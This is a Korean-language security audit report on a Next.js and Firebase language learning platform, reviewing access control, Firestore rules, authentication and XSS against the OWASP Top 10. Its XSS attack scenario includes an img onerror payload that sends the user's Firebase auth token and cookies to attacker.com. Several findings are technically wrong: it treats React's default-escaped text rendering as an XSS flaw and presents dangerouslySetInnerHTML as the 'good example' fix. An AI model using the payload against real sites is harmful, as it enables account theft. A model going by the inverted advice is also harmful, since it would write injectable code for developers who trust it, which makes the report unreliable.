# 🔐 Language Learning Platform - 보안 감사 리포트

**감사 날짜**: 2025-10-09
**감사 범위**: 전체 시스템 (프론트엔드, Firebase 백엔드, 인증, 데이터베이스)
**감사 방법**: 코드 검토, OWASP Top 10 체크리스트, 정적 분석

---

## 📊 Executive Summary

### 전체 보안 등급: **B+ (양호)**

**긍정적 요소**:
- ✅ npm 의존성 취약점 없음 (0개)
- ✅ Firebase Security Rules가 잘 구현됨
- ✅ 입력 검증이 클라이언트에서 수행됨
- ✅ HTTPS 강제 및 Firebase 인증 사용

**개선 필요 영역**:
- ⚠️ 서버사이드 인증 검증 부족
- ⚠️ XSS 방어 메커니즘 미비
- ⚠️ CSRF 토큰 부재
- ⚠️ Rate Limiting 미구현
- ⚠️ 민감 정보 로깅 위험

---

## 🎯 OWASP Top 10 (2021) 보안 분석

### 🔴 A01:2021 - Broken Access Control (접근 제어 취약점)

#### 현재 상태: **중간 위험**

**취약점**:
1. **서버사이드 인증 검증 부족**
   - 파일: `middleware.ts:27-30`
   ```typescript
   if (isProtectedPath) {
     // 클라이언트에서 인증 확인 필요
     // 여기서는 일단 통과시키고, 클라이언트에서 useEffect로 체크
     return NextResponse.next();
   }
   ```
   - **문제**: 미들웨어가 실제 인증을 검증하지 않고 모든 요청을 통과시킴
   - **영향**: 공격자가 직접 API 호출로 보호된 리소스 접근 가능

2. **Firestore Rules의 보안 약점**
   - 파일: `firestore.rules:18`
   ```
   allow read: if true;  // 모든 사용자가 다른 사용자 프로필 읽기 가능
   ```
   - **문제**: 민감한 사용자 정보가 공개됨 (이메일, 학습 진행도 등)

**권장사항**:
```typescript
// middleware.ts 개선안
export async function middleware(request: NextRequest) {
  const sessionCookie = request.cookies.get('session');

  if (isProtectedPath && !sessionCookie) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  // Firebase Admin SDK로 세션 토큰 검증
  try {
    await verifySessionCookie(sessionCookie.value);
    return NextResponse.next();
  } catch (error) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}
```

```
// firestore.rules 개선안
match /users/{userId} {
  // 공개 프로필만 읽기 가능
  allow read: if resource.data.settings.profilePublic == true;
  // 본인은 전체 프로필 읽기 가능
  allow get: if isOwner(userId);
}
```

---

### 🟡 A02:2021 - Cryptographic Failures (암호화 실패)

#### 현재 상태: **낮은 위험**

**긍정적 요소**:
- ✅ Firebase Authentication이 비밀번호 해싱 처리
- ✅ HTTPS 통신 (Firebase 자동 처리)
- ✅ 환경변수로 API 키 관리

**개선 필요**:
1. **API 키 노출 위험**
   - 파일: `.env.example`
   - **문제**: `NEXT_PUBLIC_` 접두사로 인해 클라이언트에 노출
   - **권장**: Firebase의 Domain Restriction 및 API Key Restriction 설정 필수

2. **민감 데이터 평문 저장**
   - Firestore에 사용자 이메일이 평문 저장됨
   - **권장**: PII(Personal Identifiable Information) 암호화 고려

---

### 🔴 A03:2021 - Injection (인젝션)

#### 현재 상태: **중간 위험**

**취약점**:
1. **NoSQL Injection 가능성**
   - 파일: `useCommunity.ts:88-96`
   ```typescript
   if (filters?.search) {
     const searchTerm = filters.search.toLowerCase();
     return posts.filter(p =>
       p.title.toLowerCase().includes(searchTerm) ||
       p.content.toLowerCase().includes(searchTerm)
     );
   }
   ```
   - **문제**: 사용자 입력을 sanitize 없이 직접 사용
   - **영향**: 제한적이나 클라이언트 측 필터링 우회 가능

2. **XSS (Cross-Site Scripting) 취약점**
   - 파일: `app/dashboard/community/[id]/page.tsx:171`
   ```tsx
   <p className="whitespace-pre-wrap">{post.content}</p>
   ```
   - **문제**: 사용자 입력을 sanitize 없이 직접 렌더링
   - **영향**: 악성 스크립트 삽입 가능

**권장사항**:
```typescript
// XSS 방어: DOMPurify 사용 (이미 의존성에 있음!)
import DOMPurify from 'dompurify';

<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(post.content)
  }}
/>
```

```typescript
// NoSQL Injection 방어: 입력 검증
const sanitizeSearchTerm = (input: string): string => {
  return input
    .replace(/[^a-zA-Z0-9가-힣\s]/g, '') // 특수문자 제거
    .slice(0, 100); // 길이 제한
};

if (filters?.search) {
  const searchTerm = sanitizeSearchTerm(filters.search).toLowerCase();
  // ...
}
```

---

### 🟡 A04:2021 - Insecure Design (불안전한 설계)

#### 현재 상태: **낮은 위험**

**개선 필요**:
1. **Rate Limiting 부재**
   - 로그인, 회원가입, 게시글 작성에 Rate Limiting 없음
   - **영향**: 무차별 대입 공격(Brute Force), 스팸 게시글 취약
   - **권장**: Firebase App Check 또는 Cloudflare Rate Limiting 구현

2. **CAPTCHA 부재**
   - 회원가입/로그인 시 봇 방어 없음
   - **권장**: reCAPTCHA v3 통합

---

### 🟢 A05:2021 - Security Misconfiguration (보안 구성 오류)

#### 현재 상태: **양호**

**긍정적 요소**:
- ✅ `.env.local`이 `.gitignore`에 포함됨
- ✅ Firebase Security Rules가 설정됨
- ✅ TypeScript의 strict mode 사용

**개선 필요**:
1. **개발 환경 설정 노출**
   - 파일: `next.config.ts`
   - **권장**: `reactStrictMode: true` 확인 및 프로덕션 환경 설정 분리

2. **에러 메시지 노출**
   - 파일: `hooks/useAuth.ts:56-57`
   ```typescript
   console.error('사용자 프로필 로드 실패:', err);
   ```
   - **문제**: 스택 트레이스가 브라우저 콘솔에 노출
   - **권장**: 프로덕션에서 상세 에러 로깅 제거

---

### 🟡 A06:2021 - Vulnerable and Outdated Components

#### 현재 상태: **양호**

**현재 상태**:
```bash
npm audit
  found 0 vulnerabilities
```

**의존성 버전**:
- ✅ `next`: 15.5.4 (최신)
- ✅ `react`: 19.1.0 (최신)
- ✅ `firebase`: 12.3.0 (최신)
- ✅ `dompurify`: 3.2.7 (사용되지 않고 있음!)

**권장사항**:
1. DOMPurify를 실제로 사용하여 XSS 방어
2. 정기적인 `npm audit` 및 `npm update` 실행
3. Dependabot 활성화 (GitHub)

---

### 🔴 A07:2021 - Identification and Authentication Failures

#### 현재 상태: **중간 위험**

**취약점**:
1. **세션 관리 부족**
   - Firebase 클라이언트 SDK만 사용, 서버 세션 없음
   - **영향**: 세션 하이재킹 위험

2. **비밀번호 정책 미약**
   - 파일: `hooks/useAuth.ts:129`
   ```typescript
   } else if (error.code === 'auth/weak-password') {
     setError('비밀번호는 최소 6자 이상이어야 합니다.');
   ```
   - **문제**: Firebase 기본 정책(6자)만 사용
   - **권장**: 8자 이상 + 복잡도 요구사항

3. **계정 잠금 정책 없음**
   - 로그인 실패 횟수 제한 없음
   - **권장**: Firebase App Check + 로그인 실패 추적

**권장사항**:
```typescript
// 비밀번호 복잡도 검증
const validatePassword = (password: string): string | null => {
  if (password.length < 8) {
    return '비밀번호는 최소 8자 이상이어야 합니다.';
  }
  if (!/[A-Z]/.test(password)) {
    return '대문자를 포함해야 합니다.';
  }
  if (!/[0-9]/.test(password)) {
    return '숫자를 포함해야 합니다.';
  }
  if (!/[!@#$%^&*]/.test(password)) {
    return '특수문자를 포함해야 합니다.';
  }
  return null;
};
```

---

### 🟢 A08:2021 - Software and Data Integrity Failures

#### 현재 상태: **양호**

**긍정적 요소**:
- ✅ npm package-lock.json 사용
- ✅ Firebase SDK 공식 CDN 사용

**개선 필요**:
- Subresource Integrity (SRI) 해시 사용 고려

---

### 🟡 A09:2021 - Security Logging and Monitoring Failures

#### 현재 상태: **중간 위험**

**취약점**:
1. **보안 이벤트 로깅 부족**
   - 로그인 실패, 권한 오류 등이 로깅되지 않음
   - **권장**: Sentry 또는 Firebase Analytics 통합

2. **민감 정보 로깅**
   - 파일: `lib/firebase.ts:36`
   ```typescript
   console.error(errorMessage);
   ```
   - **문제**: 환경변수 누락 시 상세 에러 노출

**권장사항**:
```typescript
// 보안 이벤트 로깅
const logSecurityEvent = (event: string, details: any) => {
  if (process.env.NODE_ENV === 'production') {
    // Sentry, Firebase Analytics 등으로 전송
    analytics.logEvent('security_event', { event, ...details });
  } else {
    console.warn(`[SECURITY] ${event}`, details);
  }
};

// 사용 예
try {
  await signIn(data);
} catch (error) {
  logSecurityEvent('login_failed', { email: data.email });
  // 사용자에게는 일반적인 메시지만 표시
  setError('로그인에 실패했습니다.');
}
```

---

### 🟡 A10:2021 - Server-Side Request Forgery (SSRF)

#### 현재 상태: **낮은 위험**

- Next.js 미들웨어에서 외부 요청 없음
- Firebase 클라이언트 SDK만 사용
- **영향**: SSRF 위험 낮음

---

## 🔥 Firebase 보안 상세 분석

### Firebase Authentication

#### ✅ 잘 구현된 부분:
1. Google OAuth 구현 (`useAuth.ts:172-249`)
2. 이메일/비밀번호 인증
3. 에러 메시지 한국어 변환

#### ⚠️ 개선 필요:
1. **이메일 인증 미구현**
   ```typescript
   // 회원가입 후 이메일 인증 추가
   await sendEmailVerification(userCredential.user);
   ```

2. **멀티팩터 인증(MFA) 부재**
   - Firebase MFA 기능 활용 고려

### Firestore Security Rules

#### ✅ 잘 구현된 부분:
1. 헬퍼 함수 사용 (`isAuthenticated()`, `isOwner()`)
2. 대부분의 컬렉션에 인증 요구
3. 서브컬렉션 보안 규칙

#### 🔴 심각한 문제:
1. **사용자 프로필 전체 공개** (Line 18)
   ```
   match /users/{userId} {
     allow read: if true;  // 🚨 위험!
   ```
   - **영향**: 이메일, 학습 데이터 등 민감 정보 노출

2. **북마크 읽기 권한 과도** (Line 97-98)
   ```
   match /bookmarks/{bookmarkId} {
     allow read, write: if isAuthenticated() &&
       resource.data.userId == request.auth.uid;
   }
   ```
   - **문제**: `resource.data` 접근 시 문서가 없으면 에러
   - **수정**:
   ```
   allow read: if isAuthenticated() &&
     (request.auth.uid == userId || resource.data.userId == request.auth.uid);
   allow write: if isAuthenticated() &&
     request.resource.data.userId == request.auth.uid;
   ```

3. **userProgress 읽기 조건 오류** (Line 29-30)
   ```
   allow read, write: if isAuthenticated() &&
     resource.data.userId == request.auth.uid;
   ```
   - **문제**: 생성 시 `resource.data`가 아직 없음
   - **수정**:
   ```
   allow read: if isAuthenticated() &&
     resource.data.userId == request.auth.uid;
   allow create: if isAuthenticated() &&
     request.resource.data.userId == request.auth.uid;
   allow update, delete: if isAuthenticated() &&
     resource.data.userId == request.auth.uid;
   ```

### Storage Security Rules

#### ✅ 잘 구현된 부분:
1. 파일 크기 제한 (5MB)
2. 이미지 타입 검증
3. 사용자별 업로드 권한 제어

#### 🟡 개선 필요:
1. **파일 확장자 검증 추가**
   ```
   function isValidImageType() {
     return request.resource.contentType.matches('image/(jpeg|png|gif|webp)');
   }
   ```

2. **업로드 Rate Limiting**
   - Firebase App Check로 스팸 업로드 방지

---

## 🌐 프론트엔드 보안 분석

### XSS (Cross-Site Scripting)

#### 🔴 Critical: 사용자 입력 직접 렌더링

**취약한 코드**:
1. `app/dashboard/community/[id]/page.tsx:171`
   ```tsx
   <p className="whitespace-pre-wrap">{post.content}</p>
   ```

2. `app/dashboard/community/[id]/page.tsx:316`
   ```tsx
   <p className="text-gray-700 dark:text-gray-300 whitespace-pre-wrap">
     {reply.content}
   </p>
   ```

3. `app/dashboard/community/write/page.tsx:219-225`
   ```tsx
   <textarea
     value={formData.content}
     onChange={(e) => setFormData(prev => ({ ...prev, content: e.target.value }))}
     placeholder="내용을 입력하세요... (마크다운 문법 지원)"
   />
   ```
   - **문제**: 마크다운을 언급하지만 실제로 파싱하지 않음

**공격 시나리오**:
```javascript
// 악성 게시글 내용
const maliciousContent = `
  안녕하세요!
  <img src=x onerror="
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: localStorage.getItem('firebase:authUser'),
        userData: document.cookie
      })
    })
  ">
`;
```

**해결 방법**:
```tsx
import DOMPurify from 'dompurify';
import ReactMarkdown from 'react-markdown';
import rehypeHighlight from 'rehype-highlight';
import remarkGfm from 'remark-gfm';

// 방법 1: DOMPurify로 sanitize
<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(post.content, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
      ALLOWED_ATTR: ['href']
    })
  }}
/>

// 방법 2: ReactMarkdown 사용 (package.json에 이미 있음!)
<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[rehypeHighlight]}
>
  {post.content}
</ReactMarkdown>
```

### CSRF (Cross-Site Request Forgery)

#### 🟡 Medium: CSRF 토큰 부재

**현재 상태**:
- Firebase는 자체적으로 CSRF 보호 제공 (SameSite 쿠키)
- 하지만 명시적인 CSRF 토큰 없음

**권장사항**:
- Next.js의 SameSite 쿠키 정책 확인
- 중요 작업(계정 삭제, 결제 등)에 재인증 요구

### 클라이언트 측 데이터 보호

#### ⚠️ localStorage/sessionStorage 사용 검토

**확인 필요**:
```bash
# localStorage 사용 위치 검색
grep -r "localStorage" app/ hooks/ lib/
```

**권장사항**:
- 민감 데이터는 localStorage에 저장 금지
- Firebase Auth 토큰만 httpOnly 쿠키로 관리

---

## 🔍 의존성 보안 분석

### 현재 의존성 상태

```json
{
  "dependencies": {
    "dompurify": "^3.2.7",      // ✅ 설치됨, 사용 안 됨!
    "react-markdown": "^10.1.0", // ✅ 설치됨, 사용 안 됨!
    "firebase": "^12.3.0",       // ✅ 최신
    "next": "15.5.4",            // ✅ 최신
    "react": "19.1.0"            // ✅ 최신
  }
}
```

### npm audit 결과
```
found 0 vulnerabilities
```

### 사용되지 않는 보안 패키지

**문제**: `dompurify`와 `react-markdown`이 설치되었지만 사용되지 않음!

**권장사항**:
1. 즉시 적용하여 XSS 방어
2. 사용하지 않는다면 제거하여 번들 크기 최적화

---

## 📈 우선순위별 개선 제안

### 🔴 Critical (즉시 수정 필요 - 24시간 내)

| 번호 | 취약점 | 위치 | 영향도 | 해결 방법 |
|------|--------|------|--------|-----------|
| 1 | **XSS 취약점** | `app/dashboard/community/[id]/page.tsx:171` | Critical | DOMPurify 또는 ReactMarkdown 적용 |
| 2 | **사용자 프로필 전체 공개** | `firestore.rules:18` | High | 읽기 권한을 `profilePublic` 설정으로 제한 |
| 3 | **서버사이드 인증 부재** | `middleware.ts:27-30` | High | Firebase Admin SDK로 세션 검증 |

**즉시 적용 가능한 코드**:
```typescript
// 1. XSS 방어 (app/dashboard/community/[id]/page.tsx)
import DOMPurify from 'dompurify';

<div
  className="prose dark:prose-invert max-w-none mb-6"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(post.content)
  }}
/>

// 2. Firestore Rules 수정
match /users/{userId} {
  allow get: if isOwner(userId);
  allow read: if resource.data.settings.profilePublic == true;
  allow create: if isOwner(userId);
  allow update: if isOwner(userId);
}

// 3. 미들웨어 인증 추가 (firebase-admin 설치 필요)
import { auth } from 'firebase-admin';

export async function middleware(request: NextRequest) {
  const sessionCookie = request.cookies.get('__session');

  if (isProtectedPath) {
    if (!sessionCookie) {
      return NextResponse.redirect(new URL('/login', request.url));
    }

    try {
      await auth().verifySessionCookie(sessionCookie.value, true);
      return NextResponse.next();
    } catch (error) {
      return NextResponse.redirect(new URL('/login', request.url));
    }
  }

  return NextResponse.next();
}
```

### 🟡 High (24시간 내 수정)

| 번호 | 취약점 | 위치 | 영향도 | 해결 방법 |
|------|--------|------|--------|-----------|
| 4 | **NoSQL Injection** | `useCommunity.ts:93-94` | Medium | 입력 sanitize 및 길이 제한 |
| 5 | **비밀번호 정책 미약** | `useAuth.ts` | Medium | 8자 이상 + 복잡도 요구 |
| 6 | **Rate Limiting 부재** | 전역 | Medium | Firebase App Check 구현 |
| 7 | **이메일 인증 부재** | `useAuth.ts:119` | Medium | `sendEmailVerification` 추가 |

### 🟢 Medium (1주일 내 수정)

| 번호 | 취약점 | 위치 | 영향도 | 해결 방법 |
|------|--------|------|--------|-----------|
| 8 | **CAPTCHA 부재** | 로그인/회원가입 | Low | reCAPTCHA v3 통합 |
| 9 | **에러 로깅 노출** | 전역 | Low | 프로덕션 로깅 정책 수립 |
| 10 | **보안 모니터링 부족** | 전역 | Low | Sentry 또는 Firebase Analytics 통합 |

---

## 🛠️ 즉시 적용 가능한 보안 체크리스트

### 1단계: 긴급 패치 (1시간)

```bash
# 1. DOMPurify 적용
# app/dashboard/community/[id]/page.tsx 수정 (위 코드 참조)

# 2. Firestore Rules 업데이트
firebase deploy --only firestore:rules

# 3. 환경변수 검증
cat .env.local  # API 키 노출 확인
```

### 2단계: 인증 강화 (4시간)

```bash
# 1. firebase-admin 설치
npm install firebase-admin

# 2. middleware.ts 업데이트 (위 코드 참조)

# 3. 비밀번호 정책 강화
# hooks/useAuth.ts에 validatePassword 함수 추가
```

### 3단계: 모니터링 설정 (1일)

```bash
# 1. Sentry 설치
npm install @sentry/nextjs

# 2. Sentry 초기화
npx @sentry/wizard@latest -i nextjs

# 3. 보안 이벤트 로깅 추가
```

---

## 📋 보안 체크리스트 (일일 점검용)

### 개발 단계
- [ ] 모든 사용자 입력을 sanitize 했는가?
- [ ] API 키가 .env.local에만 있고 .gitignore에 포함되었는가?
- [ ] Firebase Security Rules를 테스트했는가?
- [ ] 에러 메시지에 민감 정보가 포함되지 않았는가?

### 배포 단계
- [ ] `npm audit` 실행 및 취약점 해결
- [ ] Firebase Security Rules 배포
- [ ] 환경변수 프로덕션 설정 확인
- [ ] HTTPS 강제 설정 확인

### 운영 단계
- [ ] 보안 이벤트 모니터링 (주 1회)
- [ ] 의존성 업데이트 (월 1회)
- [ ] 접근 로그 검토 (월 1회)
- [ ] 보안 감사 (분기 1회)

---

## 🎓 보안 가이드라인 (팀 공유용)

### 개발 시 반드시 지킬 것

1. **사용자 입력 처리**
   ```typescript
   // ❌ 나쁜 예
   <div>{userInput}</div>

   // ✅ 좋은 예
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
   ```

2. **API 호출**
   ```typescript
   // ❌ 나쁜 예
   const API_KEY = "sk-1234567890";

   // ✅ 좋은 예
   const API_KEY = process.env.API_KEY;
   ```

3. **에러 처리**
   ```typescript
   // ❌ 나쁜 예
   console.error('에러 발생:', error);

   // ✅ 좋은 예
   if (process.env.NODE_ENV === 'development') {
     console.error('에러 발생:', error);
   }
   logToSentry(error);
   ```

---

## 📞 보안 연락처

**보안 취약점 발견 시**:
- 이메일: security@yourdomain.com (설정 필요)
- 보고 방법: [SECURITY.md](SECURITY.md) 참조 (작성 필요)

**긴급 보안 사고 발생 시**:
1. 즉시 서비스 중단 검토
2. Firebase Console에서 악의적 사용자 계정 비활성화
3. Security Rules 긴급 업데이트
4. 영향 받은 사용자 통지

---

## 📚 참고 자료

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Firebase Security Best Practices](https://firebase.google.com/docs/rules/best-practices)
- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)
- [React Security Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/React_Security_Cheat_Sheet.html)

---

**리포트 종료**

이 보안 감사 리포트는 2025-10-09 기준으로 작성되었습니다.
정기적인 보안 점검을 통해 최신 위협에 대응하시기 바랍니다.
